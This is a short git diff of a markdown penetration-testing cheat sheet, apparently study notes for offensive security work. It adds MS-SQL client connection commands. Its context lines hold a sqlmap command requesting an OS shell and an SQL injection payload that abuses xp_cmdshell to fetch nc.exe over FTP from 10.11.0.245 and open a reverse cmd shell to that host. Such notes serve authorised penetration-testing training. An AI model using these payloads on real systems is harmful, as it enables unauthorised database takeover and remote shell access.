@@ -248,6 +248,13 @@ sqlmap -r post-request -p item --level=5 --risk=3 --dbms=mysql --os-shell --thre
 1000';+exec+master.dbo.xp_cmdshell+'(echo+open+10.11.0.245%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+>+c:\ftp.txt+%26+ftp+-s:c:\ftp.txt+%26+nc.exe+10.11.0.245+443+-e+cmd';--
 ```
 
+#### MS-SQL Console
+```bash
+mssqlclient.py -port 27900 user:password@10.1.1.1
+sqsh -S 10.1.1.1 -U user -P password
+```
+
+
 ## Local Enumeration & Privilege Escalation
 
 #### Binary Exploitation with ImmunityDebugger
